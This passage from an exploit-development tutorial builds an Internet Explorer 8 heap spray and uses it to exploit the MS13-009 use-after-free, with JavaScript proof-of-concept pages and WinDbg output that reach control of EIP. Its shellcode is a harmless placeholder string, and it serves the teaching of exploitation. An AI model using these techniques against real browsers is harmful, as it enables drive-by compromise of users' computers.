a vtable pointer. If we free\nthe object before it gets called the program will crash when it later\ntries to call the object (eg: it tries to Use the object After it was\nFreed \u2013 UAF).\nTo exploit this issue we will generically perform the following steps:\n(1) At some point an object gets created, (2) we trigger a free on this\nobject, (3) we create our own object which resembles as closely as\npossible the original objects size, (4) later when the vtable pointer\nis called our fake object will be used and we gain code execution.\nAs usual all of this sounds terribly complicated but things will become\nmore clear with our practical example. First we will create a reliable\nheap spray to get that out of the way then we will focus our attention\non ms13-009!\nHeaps of Shellcode\nAs we did in Part 8 I want to begin by getting a reliable heap spray on\nIE8. Continuing the work we did before we can start off with the\nfollowing POC. This POC has been slightly modified from the version\nthat was in Part 8. The main difference here is that I have added a\nfunction called alloc which takes our buffer as input and adjusts the\nsize of the allocations so they match the BSTR specifications (we need\nto subtract 6 to compensate for the BSTR header and footer and divide\nby two because we are using unicode unescape).\n<html>\n<script>\n\/\/Fix BSTR spec\nfunction alloc(bytes, mystr) {\nwhile (mystr.length<bytes) mystr += mystr;\nreturn mystr.substr(0, (bytes-6)\/2);\n}\nblock_size = 0x1000; \/\/ 4096-bytes\nNopSlide = '';\nvar Shellcode = unescape(\n'%u7546%u7a7a%u5379'+   \/\/ ASCII\n'%u6365%u7275%u7469'+   \/\/ FuzzySecurity\n'%u9079');\nfor (c = 0; c < block_size; c++){\nNopSlide += unescape('%u9090');}\nNopSlide = NopSlide.substring(0,block_size - Shellcode.length);\nvar OBJECT = Shellcode + NopSlide;\nOBJECT = alloc(0xfffe0, OBJECT); \/\/ 0xfffe0 = 1mb\nvar evil = new Array();\nfor (var k = 0; k < 150; k++) {\nevil[k] = OBJECT.substr(0, OBJECT.length);\n}\nalert(\"Spray Done!\");\n<\/script>\n<\/html>\nLet's have a quick look in the debugger and see what happens when we\nexecute this spray.\nLooking at the default process heap we can see that our spray accounts for 98,24\n% of the busy blocks, we\ncan tell it is our spray because the blocks have a size of 0xfffe0 (= 1 mb).\n0:019> !heap -stat -h 00150000\nheap @ 00150000\ngroup-by: TOTSIZE max-display: 20\nsize     #blocks     total     ( %) (percent of total busy bytes)\nfffe0 97 - 96fed20  (98.24)\n3fff8 3 - bffe8  (0.49)\n7ff8 f - 77f88  (0.30)\n1fff8 3 - 5ffe8  (0.24)\n1ff8 28 - 4fec0  (0.20)\nfff8 3 - 2ffe8  (0.12)\n3ff8 7 - 1bfc8  (0.07)\nff8 13 - 12f68  (0.05)\n7f8 1e - ef10  (0.04)\n8fc1 1 - 8fc1  (0.02)\n5fc1 1 - 5fc1  (0.02)\n57e0 1 - 57e0  (0.01)\n3f8 15 - 5358  (0.01)\n4fc1 1 - 4fc1  (0.01)\n5e4 b - 40cc  (0.01)\n3980 1 - 3980  (0.01)\n20 1bb - 3760  (0.01)\n388 d - 2de8  (0.01)\n2cd4 1 - 2cd4  (0.01)\n480 7 - 1f80  (0.01)\nListing only the allocation with a size of 0xfffe0 we can see that our spray is\nhuge stretching from\n0x03680018 to 0x0d660018. Another important thing to notice is that the Heap Ent\nry Addresses all seem\nto end like this 0x????0018, this is a good indicator that our spray is reliable\n.\n0:019> !heap -flt s fffe0\n_HEAP @ 150000\nHEAP_ENTRY Size Prev Flags    UserPtr UserSize - state\n03680018 1fffc 0000  [0b]   03680020    fffe0 - (busy VirtualAlloc)\n03a30018 1fffc fffc  [0b]   03a30020    fffe0 - (busy VirtualAlloc)\n03790018 1fffc fffc  [0b]   03790020    fffe0 - (busy VirtualAlloc)\n038a0018 1fffc fffc  [0b]   038a0020    fffe0 - (busy VirtualAlloc)\n03b40018 1fffc fffc  [0b]   03b40020    fffe0 - (busy VirtualAlloc)\n03c50018 1fffc fffc  [0b]   03c50020    fffe0 - (busy VirtualAlloc)\n[...snip...]\n0d110018 1fffc fffc  [0b]   0d110020    fffe0 - (busy VirtualAlloc)\n0d220018 1fffc fffc  [0b]   0d220020    fffe0 - (busy VirtualAlloc)\n0d330018 1fffc fffc  [0b]   0d330020    fffe0 - (busy VirtualAlloc)\n0d440018 1fffc fffc  [0b]   0d440020    fffe0 - (busy VirtualAlloc)\n0d550018 1fffc fffc  [0b]   0d550020    fffe0 - (busy VirtualAlloc)\n0d660018 1fffc fffc  [0b]   0d660020    fffe0 - (busy VirtualAlloc)\n0:019> d 03694024-10\n03694014  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03694024  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n03694034  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03694044  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03694054  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03694064  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03694074  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03694084  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0:019> d 03694024-10+2000\n03696014  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03696024  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n03696034  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03696044  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03696054  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03696064  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03696074  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03696084  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0:019> d 03694024-10+4000\n03698014  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03698024  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n03698034  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03698044  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03698054  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03698064  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03698074  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n03698084  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\nWe are particularly interested in the address 0x0c0c0c0c. Since this address has\nbeen allocate on the heap\nby our spray we can use the command below we can find out which Heap Entry 0x0c0\nc0c0c belongs to.\n0:019> !heap -p -a 0c0c0c0c\naddress 0c0c0c0c found in\n_HEAP @ 150000\nHEAP_ENTRY Size Prev Flags    UserPtr UserSize - state\n0c010018 1fffc 0000  [0b]   0c010020    fffe0 - (busy VirtualAlloc)\nThe image below is a visual representation of our spray. We have filled\nthe heap with 150mb of our own data, these 150mb are divided into 150\nchunks of 1mb (each chunk is stored as a separate BSTR object). This\nBSTR object is in turn filled with blocks of 0x1000 hex (4096-bytes)\nthat contain our shellcode and our NOP's.\nSo far so good! Next we need to realign our heap spray so the shellcode\nvariable points exactly at 0x0c0c0c0c which will be the beginning of\nour ROP chain. Consider if 0x0c0c0c0c is allocated somewhere in memory\nbecause of our heap spray then it must have a specific offset inside\nour 0x1000 block. What we will want to do is calculate the offset from\nthe start of the block to 0x0c0c0c0c and add that as padding to our\nspray.\n________________________                          ________________________\n|                        |                        |                        |\n|       Shellcode        |                        |        Padding         |\n|------------------------|                        |                        |\n|                        |                        |                        |\n|                        |                        |                        |\n|                        |                        |                        |\n|                        |                        |                        |\n|                        | <-- 0x0c0c0c0c         |------------------------| <--\n0x0c0c0c0c\n|                        |     Points into our    |                        |\nPoints at the\n|         NOP's          |     NOP's.             |       Shellcode        |\nbeginning of our\n|                        |                        |                        |\nshellcode.\n|                        |                        |                        |\n|                        |                        |                        |\n|                        |                        |                        |\n|                        |                        |        [+ NOP's]       |\n|                        |                        |                        |\n|     (0x1000 Block)     |                        |     (0x1000 Block)     |\n|________________________|                        |________________________|\nIf you rerun the spray above you will notice that 0x0c0c0c0c will not\nalways point to the same Heap Entry however the offset from the start\nof our 0x1000 hex block to 0x0c0c0c0c will always remain constant. We\nalready have all the information that we need to calculate the size of\nour padding.\n0:019> !heap -p -a 0c0c0c0c\naddress 0c0c0c0c found in\n_HEAP @ 150000\nHEAP_ENTRY Size Prev Flags    UserPtr UserSize - state\n0c010018 1fffc 0000  [0b]   0c010020    fffe0 - (busy VirtualAlloc)\n0x0c0c0c0c (Address we are interested in)\n- 0x0c010018 (Heap Entry Address)\n----------\n0xb0bf4 => Distance between the Heap Entry address and 0x0c0c0c0c, this val\nue will be different from\nspray to spray. Next we need to find out what the offset is in o\nur 0x1000 hex block. We\ncan do this by subtracting multiples of 0x1000 till we have a va\nlue that is smaller than\n0x1000 hex (4096-bytes).\n0xbf4 => We need to correct this value based on our allocation size => (x\n\/2)-6\n0x5f4 => If we insert a padding of this size in our 0x1000 block it will\nalign our shellcode\nexactly to 0x0c0c0c0c.\nLet's modify the POC and rerun the spray in the debugger.\n<html>\n<script>\n\/\/Fix BSTR spec\nfunction alloc(bytes, mystr) {\nwhile (mystr.length<bytes) mystr += mystr;\nreturn mystr.substr(0, (bytes-6)\/2);\n}\nblock_size = 0x1000;\npadding_size = 0x5F4; \/\/offset to 0x0c0c0c0c inside our 0x1000 hex block\nPadding = '';\nNopSlide = '';\nvar Shellcode = unescape(\n'%u7546%u7a7a%u5379'+   \/\/ ASCII\n'%u6365%u7275%u7469'+   \/\/ FuzzySecurity\n'%u9079');\nfor (p = 0; p < padding_size; p++){\nPadding += unescape('%ub33f');}\nfor (c = 0; c < block_size; c++){\nNopSlide += unescape('%u9090');}\nNopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding\n.length));\nvar OBJECT = Padding + Shellcode + NopSlide;\nOBJECT = alloc(0xfffe0, OBJECT); \/\/ 0xfffe0 = 1mb\nvar evil = new Array();\nfor (var k = 0; k < 150; k++) {\nevil[k] = OBJECT.substr(0, OBJECT.length);\n}\nalert(\"Spray Done!\");\n<\/script>\n<\/html>\nAs we can see below we have managed to realign our shellcode to\n0x0c0c0c0c. In fact when we search in memory for the string\n\"FuzzySecurity\" we can see that all locations end in the same bytes\n0x?????c0c.\n0:019> !heap -stat -h 00150000\nheap @ 00150000\ngroup-by: TOTSIZE max-display: 20\nsize     #blocks     total     ( %) (percent of total busy bytes)\nfffe0 97 - 96fed20  (98.18)\n3fff8 3 - bffe8  (0.49)\n7ff8 f - 77f88  (0.30)\n1fff8 3 - 5ffe8  (0.24)\n1ff8 2b - 55ea8  (0.22)\nfff8 4 - 3ffe0  (0.16)\n3ff8 8 - 1ffc0  (0.08)\nff8 13 - 12f68  (0.05)\n7f8 1e - ef10  (0.04)\n8fc1 1 - 8fc1  (0.02)\n5fc1 1 - 5fc1  (0.02)\n57e0 1 - 57e0  (0.01)\n3f8 15 - 5358  (0.01)\n4fc1 1 - 4fc1  (0.01)\n5e4 b - 40cc  (0.01)\n3980 1 - 3980  (0.01)\n20 1bb - 3760  (0.01)\n388 d - 2de8  (0.01)\n2cd4 1 - 2cd4  (0.01)\n480 7 - 1f80  (0.01)\n0:019> s -a 0x00000000 L?7fffffff \"FuzzySecurity\"\n[...snip...]\n0c0c0c0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n[...snip...]\n0d874c0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n0d876c0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n0d878c0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n0d87ac0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n0d87cc0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n0d87ec0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n0:019> d 0c0c0c0c-20\n0c0c0bec  3f b3 3f b3 3f b3 3f b3-3f b3 3f b3 3f b3 3f b3  ?.?.?.?.?.?.?.?.\n0c0c0bfc  3f b3 3f b3 3f b3 3f b3-3f b3 3f b3 3f b3 3f b3  ?.?.?.?.?.?.?.?.\n0c0c0c0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...\n0c0c0c1c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0c0c0c2c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0c0c0c3c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0c0c0c4c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\n0c0c0c5c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................\nSo we have now managed to realign our heap spray in such a manner that\nwe can make our shellcode to point to an arbitrary address of our\nchoice (in this case 0x0c0c0c0c). The heap spray works on IE7-8 and has\nbeen tested on Windows XP and Windows 7. With some modification it can\nbe made to work on IE9 as well but that is outside the scope of this\ntutorial.\nA Closer Look at MS13-009\nAs mentioned before, the main goal of this tutorial is not to analyze\nthe vulnerability it is to understand what obstacles you face when\nwriting the exploit. We will however take a quick look at the\nvulnerability to understand what is happening. The following POC is the\nmost streamlined case file that triggers the bug.\n<!doctype html>\n<html>\n<head>\n<script>\nsetTimeout(function(){\ndocument.body.style.whiteSpace = \"pre-line\";\n\/\/CollectGarbage();\nsetTimeout(function(){document.body.innerHTML = \"boo\"}, 100)\n}, 100)\n<\/script>\n<\/head>\n<body>\n<p> <\/p>\n<\/body>\n<\/html>\nOk let's have a look in the debugger to see what happens when we\ntrigger the vulnerability. You will notice that I have added (but\ncommented out) the CollectGarbage() function. During my testing I\nnoticed that the bug is a bit unreliable (only about 80%) so I was\nexperimenting with CollectGarbage() to see if that would improve the\nreliability. CollectGarbage() is a function exposed by javascript which\nempties four bins which are implemented through a custom heap\nmanagement engine in oleaut32.dll. This will only become relevant later\nwhen we try to allocate our own fake object on the heap. From my\ntesting I could not determine that it made any difference but if anyone\nhas any input about this leave a comment below.\nFrom the execution flow below we can see that an object is trying to\ncall a function in a vtable at an offset of 0x70 hex from EAX.\n0:019> g\n(e74.f60): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00205618 ecx=024e0178 edx=00000000 esi=0162bcd0 edi=00000000\neip=3cf76982 esp=0162bca4 ebp=0162bcbc iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CElement::Doc+0x2:\n3cf76982 8b5070          mov     edx,dword ptr [eax+70h] ds:0023:00000070=??????\n??\n0:008> uf mshtml!CElement::Doc\nmshtml!CElement::Doc:\n3cf76980 8b01            mov     eax,dword ptr [ecx]\n3cf76982 8b5070          mov     edx,dword ptr [eax+70h]\n3cf76985 ffd2            call    edx\n3cf76987 8b400c          mov     eax,dword ptr [eax+0Ch]\n3cf7698a c3              ret\nThe stacktrace shows us what execution flow was like leading up to the\ncrash. If we unassemble at the return address where the call was\nsupposed to return to if it had not crashed we can see how our function\nwas called. It seems like some object in EBX passed it's vtable pointer\nto ECX and that is then later referenced by mshtml!CElement::Doc to\ncall a function at an offset of 0x70 hex.\n0:008> knL\n# ChildEBP RetAddr\n00 0162bca0 3cf149d1 mshtml!CElement::Doc+0x2\n01 0162bcbc 3cf14c3a mshtml!CTreeNode::ComputeFormats+0xb9\n02 0162bf68 3cf2382e mshtml!CTreeNode::ComputeFormatsHelper+0x44\n03 0162bf78 3cf237ee mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11\n04 0162bf88 3cf237d5 mshtml!CTreeNode::GetFancyFormatHelper+0xf\n05 0162bf98 3d013ef0 mshtml!CTreeNode::GetFancyFormat+0x35\n06 0162bfb8 3d030be9 mshtml!CLayoutBlock::GetDisplayAndPosition+0x77\n07 0162bfd4 3d034850 mshtml!CLayoutBlock::IsBlockNode+0x1e\n08 0162bfec 3d0347e2 mshtml!SLayoutRun::GetInnerNodeCrossingBlockBoundary+0x43\n09 0162c008 3d0335ab mshtml!CTextBlock::AddSpansOpeningBeforeBlock+0x1f\n0a 0162d71c 3d03419d mshtml!CTextBlock::BuildTextBlock+0x280\n0b 0162d760 3d016538 mshtml!CLayoutBlock::BuildBlock+0x1ec\n0c 0162d7e0 3d018419 mshtml!CBlockContainerBlock::BuildBlockContainer+0x59c\n0d 0162d818 3d01bb86 mshtml!CLayoutBlock::BuildBlock+0x1c1\n0e 0162d8dc 3d01ba45 mshtml!CCssDocumentLayout::GetPage+0x22a\n0f 0162da4c 3cf5bdc7 mshtml!CCssPageLayout::CalcSizeVirtual+0x254\n10 0162db84 3cee2c95 mshtml!CLayout::CalcSize+0x2b8\n11 0162dc20 3cf7e59c mshtml!CView::EnsureSize+0xda\n12 0162dc64 3cf8a648 mshtml!CView::EnsureView+0x340\n13 0162dc8c 3cf8a3b9 mshtml!CView::EnsureViewCallback+0xd2\n14 0162dcc0 3cf750de mshtml!GlobalWndOnMethodCall+0xfb\n15 0162dce0 7e418734 mshtml!GlobalWndProc+0x183\n16 0162dd0c 7e418816 USER32!InternalCallWinProc+0x28\n17 0162dd74 7e4189cd USER32!UserCallWinProcCheckWow+0x150\n18 0162ddd4 7e418a10 USER32!DispatchMessageWorker+0x306\n19 0162dde4 3e2ec29d USER32!DispatchMessageW+0xf\n1a 0162feec 3e293367 IEFRAME!CTabWindow::_TabWindowThreadProc+0x54c\n1b 0162ffa4 3e135339 IEFRAME!LCIETab_ThreadProc+0x2c1\n1c 0162ffb4 7c80b729 iertutil!CIsoScope::RegisterThread+0xab\n1d 0162ffec 00000000 kernel32!BaseThreadStart+0x37\n0:008> u 3cf149d1-7\nmshtml!CTreeNode::ComputeFormats+0xb2:\n3cf149ca 8b0b            mov     ecx,dword ptr [ebx]\n3cf149cc e8af1f0600      call    mshtml!CElement::Doc (3cf76980)\n3cf149d1 53              push    ebx\n3cf149d2 891e            mov     dword ptr [esi],ebx\n3cf149d4 894604          mov     dword ptr [esi+4],eax\n3cf149d7 8b0b            mov     ecx,dword ptr [ebx]\n3cf149d9 56              push    esi\n3cf149da e837010000      call    mshtml!CElement::ComputeFormats (3cf14b16)\nWe can confirm our suspicions by looking at some register values.\n0:008> d ebx\n00205618  78 01 4e 02 00 00 00 00-4d 20 ff ff ff ff ff ff  x.N.....M ......\n00205628  51 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  Q...............\n00205638  00 00 00 00 00 00 00 00-52 00 00 00 00 00 00 00  ........R.......\n00205648  00 00 00 00 00 00 00 00-00 00 00 00 80 3f 4e 02  .............?N.\n00205658  01 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n00205668  a5 0d a8 ea 00 01 0c ff-b8 38 4f 02 e8 4f 20 00  .........8O..O .\n00205678  71 02 ff ff ff ff ff ff-71 01 00 00 01 00 00 00  q.......q.......\n00205688  f8 4f 20 00 80 4b 20 00-f8 4f 20 00 98 56 20 00  .O ..K ..O ..V .\n0:008> d ecx\n024e0178  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n024e0188  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n024e0198  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n024e01a8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n024e01b8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n024e01c8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n024e01d8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n024e01e8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n0:008> r\neax=00000000 ebx=00205618 ecx=024e0178 edx=00000000 esi=0162bcd0 edi=00000000\neip=3cf76982 esp=0162bca4 ebp=0162bcbc iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nBy using some crafty breakpoints we can track the allocations which are\nmade by mshtml!CTreeNode to see if any familiar values pop up. The\nresults below indicate that EBX points at CparaElement and that the\nfunction which should have been called was Celement::SecurityContext.\nThis seems to correspond with the vulnerability description for\nMS13-009: \"A Use-After-Free vulnerability in Microsoft Internet\nExplorer where a CParaElement node is released but a reference is still\nkept in CDoc. This memory is reused when a CDoc re-layout is\nperformed.\".\n0:019> bp mshtml!CTreeNode::CTreeNode+0x8c \".printf \\\"mshtml!CTreeNode::CTreeNod\ne allocated obj at %08x,\nref to obj %08x of type %08x\\\\n\\\", eax, poi(eax), poi(poi(eax)); g\"\n0:019> g\nmshtml!CTreeNode::CTreeNode allocated obj at 002059d8, ref to obj 024d1f70 of ty\npe 3cebd980\nmshtml!CTreeNode::CTreeNode allocated obj at 002060b8, ref to obj 024d1e80 of ty\npe 3cebd980\nmshtml!CTreeNode::CTreeNode allocated obj at 002060b8, ref to obj 0019ef80 of ty\npe 3cf6fb00\nmshtml!CTreeNode::CTreeNode allocated obj at 00206218, ref to obj 024d1e80 of ty\npe 3cecf528\nmshtml!CTreeNode::CTreeNode allocated obj at 00205928, ref to obj 024d1be0 of ty\npe 3cecf7f8\nmshtml!CTreeNode::CTreeNode allocated obj at 00206008, ref to obj 024ff7d0 of ty\npe 3cecfa78\nmshtml!CTreeNode::CTreeNode allocated obj at 00205c98, ref to obj 024151c0 of ty\npe 3ceca868\nmshtml!CTreeNode::CTreeNode allocated obj at 002054b0, ref to obj 024ff840 of ty\npe 3cedcfe8\nmshtml!CTreeNode::CTreeNode allocated obj at 00205fb0, ref to obj 024d1c10 of ty\npe 3cee61e8\nmshtml!CTreeNode::CTreeNode allocated obj at 00206060, ref to obj 030220b0 of ty\npe 3cebd980\nmshtml!CTreeNode::CTreeNode allocated obj at 002062c8, ref to obj 03022110 of ty\npe 3cecf528\nmshtml!CTreeNode::CTreeNode allocated obj at 00206320, ref to obj 03022170 of ty\npe 3cecf7f8\nmshtml!CTreeNode::CTreeNode allocated obj at 00206378, ref to obj 024ffb88 of ty\npe 3cecfa78\nmshtml!CTreeNode::CTreeNode allocated obj at 002063d0, ref to obj 024ffb50 of ty\npe 3cedcfe8\n(b54.cd4): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00205fb0 ecx=024d0183 edx=00000000 esi=0162bcd0 edi=00000000\neip=3cf76982 esp=0162bca4 ebp=0162bcbc iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CElement::Doc+0x2:\n3cf76982 8b5070          mov     edx,dword ptr [eax+70h] ds:0023:00000070=??????\n??\n0:008> ln 3cee61e8\n(3cee61e8)   mshtml!CParaElement::`vftable'   |  (3d071410)   mshtml!CUListEleme\nnt::`vftable'\nExact matches:\nmshtml!CParaElement::`vftable' = <no type information>\n0:008> ln poi(mshtml!CParaElement::`vftable'+0x70)\n(3cf76950)   mshtml!CElement::SecurityContext   |  (3cf76980)   mshtml!CElement:\n:Doc\nExact matches:\nmshtml!CElement::SecurityContext (<no parameter info>)\nMS13-009 EIP\nAs I mentioned before the main focus here is how to overcome the\nobstacles we face during the exploit development process so I will be\nnot take time to explain how to acclocate our own object on the heap.\nInstead I will use a snippet from a publicly available exploit. Our new\nPOC can be seen below.\n<!doctype html>\n<html>\n<head>\n<script>\nvar data;\nvar objArray = new Array(1150);\nsetTimeout(function(){\ndocument.body.style.whiteSpace = \"pre-line\";\n\/\/CollectGarbage();\nfor (var i=0;i<1150;i++){\nobjArray[i] = document.createElement('div');\nobjArray[i].className = data += unescape(\"%u0c0c%u0c0c\");\n}\nsetTimeout(function(){document.body.innerHTML = \"boo\"}, 100)\n}, 100)\n<\/script>\n<\/head>\n<body>\n<p> <\/p>\n<\/body>\n<\/html>\nAgain notice the CollectGarbage() function, feel free to play around\nwith it and see if it makes any significant difference when trying to\nallocate the object. Lets have a look in the debugger and see what\nhappens when we execute this POC.\n0:019> g\n(ee4.d9c): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0c0c0c0c ebx=00205fb0 ecx=024c0018 edx=00000000 esi=0162bcd0 edi=00000000\neip=3cf76982 esp=0162bca4 ebp=0162bcbc iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CElement::Doc+0x2:\n3cf76982 8b5070          mov     edx,dword ptr [eax+70h] ds:0023:0c0c0c7c=??????\n??\n0:008> d ebx\n00205fb0  18 00 4c 02 00 00 00 00-4d 20 ff ff ff ff ff ff  ..L.....M ......\n00205fc0  51 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  Q...............\n00205fd0  00 00 00 00 00 00 00 00-52 00 00 00 00 00 00 00  ........R.......\n00205fe0  00 00 00 00 00 00 00 00-00 00 00 00 50 f7 4c 02  ............P.L.\n00205ff0  01 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n00206000  78 0b a8 ea 00 01 0c ff-f8 1c 4e 02 70 57 20 00  x.........N.pW .\n00206010  71 02 02 00 01 00 00 00-71 01 00 00 01 00 00 00  q.......q.......\n00206020  80 57 20 00 48 5b 20 00-80 57 20 00 30 60 20 00  .W .H[ ..W .0` .\n0:008> d ecx\n024c0018  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n024c0028  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n024c0038  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n024c0048  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n024c0058  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n024c0068  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n024c0078  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n024c0088  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n0:008> uf mshtml!CElement::Doc\nmshtml!CElement::Doc:\n3cf76980 8b01            mov     eax,dword ptr [ecx]      \/\/\/ eax = 0x0c0c0c0c\n3cf76982 8b5070          mov     edx,dword ptr [eax+70h]  \/\/\/ edx = 0x0c0c0c0c +\n0x70 = DWORD 0x0c0c0c7c\n3cf76985 ffd2            call    edx                      \/\/\/ call DWORD 0x0c0c0\nc7c\nThis sequence of instructions will end up calling the DWORD value of\n0x0c0c0c7c (= EIP) if 0x0c0c0c7c is a valid location in memory which is\nnot the case at the moment. Remember our heap spray was set to align\nthe shellcode variable to 0x0c0c0c0c, we will see why this is necessary\nlater. Just remember we can set EIP to whatever value that we want, for\nexample the DWORD value of 0xaaaaaaaa. This can be achieved by\noverwriting EAX with 0xaaaaaaaa-0x70 = 0xaaaaaa3a. You can see an\nexample of this below.\n<!doctype html>\n<html>\n<head>\n<script>\nvar data;\nvar objArray = new Array(1150);\nsetTimeout(function(){\ndocument.body.style.whiteSpace = \"pre-line\";\n\/\/CollectGarbage();\nfor (var i=0;i<1150;i++){\nobjArray[i] = document.createElement('div');\nobjArray[i].className = data += unescape(\"%uaaaa%uaa3a\"); \/\/Will set\nedx to DWORD 0xaaaaaaaa [EIP]\n}\nsetTimeout(function(){document.body.innerHTML = \"boo\"}, 100)\n}, 100)\n<\/script>\n<\/head>\n<body>\n<p> <\/p>\n<\/body>\n<\/html>\nLet's have a look in the debugger to verify that we will now end up\noverwriting EIP with 0xaaaaaaaa.\n0:019> g\n(8cc.674): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=aaaaaa3a ebx=002060a8 ecx=024c00c8 edx=00000000 esi=0162bcd0 edi=00000000\neip=3cf76982 esp=0162bca4 ebp=0162bcbc iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CElement::Doc+0x2:\n3cf76982 8b5070          mov     edx,dword ptr [eax+70h] ds:0023:aaaaaaaa=??????\n??\n0:019> d ecx\n024c00c8  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................\n024c00d8  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................\n024c00e8  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................\n024c00f8  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................\n024c0108  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................\n024c0118  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................\n024c0128  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................\n024c0138  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................\nMS13-009 Code Execution\nWe have come quite a way! Putting together the work we have done so far\nwe can start our journey to code execution. First order of business is\nto create our new POC which contains our spray and triggers the\nvulnerability.\n<!doctype html>\n<html>\n<head>\n<script>\n\/\/Fix BSTR spec\nfunction alloc(bytes, mystr) {\nwhile (mystr.length<bytes) mystr += mystr;\nreturn mystr.substr(0, (bytes-6)\/2);\n}\nblock_size = 0x1000;\npadding_size = 0x5F4; \/\/0x5FA => offset 0x1000 hex block to 0x0c0c0c0c\nPadding = '';\nNopSlide 